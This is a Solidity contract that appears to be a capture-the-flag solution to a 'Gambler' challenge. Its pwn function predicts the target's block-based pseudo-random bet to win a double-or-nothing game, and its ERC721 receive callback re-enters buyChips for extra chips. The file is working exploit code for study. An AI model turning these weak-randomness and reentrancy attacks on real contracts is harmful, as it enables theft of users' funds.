// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "../challenges/Gambler/libGambler.sol";
import "../challenges/Gambler/IERC721Receiver.sol";

interface IGambler is IERC721Receiver {
    function buyChips(uint256 numChips) external;

    function getVerified() external payable;

    function doubleOrNothing(address acount, uint256 bet) external;

    function Gambler(address account) external view returns (bool);
}

contract GamblerSolution {
    using libGambler for uint256;

    IGambler public gambler;
    bool public buyAgain = true;

    function pwn(address gambler_) external payable {
        gambler = IGambler(gambler_);

        address account = 0x0000000000000000000000000000000000000000;
        uint256 bet = uint256(keccak256(abi.encodePacked(block.timestamp, block.coinbase, account, "sus"))) %
            block.difficulty;

        gambler.buyChips(16);
        gambler.getVerified{ value: 0 }();
        gambler.doubleOrNothing(account, bet);
    }

    function isChallengeSolved() external view returns (bool) {
        return gambler.Gambler(address(this));
    }

    function onERC721Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*tokenId*/
        bytes calldata /*data*/
    ) external returns (bytes4) {
        if (buyAgain) {
            buyAgain = false;
            gambler.buyChips(16);
        }

        return GamblerSolution.onERC721Received.selector;
    }
}
